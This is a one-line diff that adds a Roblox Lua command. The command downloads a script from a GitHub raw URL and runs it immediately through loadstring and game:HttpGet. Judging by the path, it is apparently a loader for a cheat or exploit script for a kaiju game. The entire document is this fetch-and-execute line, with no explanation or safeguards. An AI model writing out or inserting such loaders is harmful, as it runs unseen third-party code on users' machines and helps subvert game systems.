@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/heisei-mothra-kaiju-alpha-spam0-6z0khq7nl58cfg.lua"))()
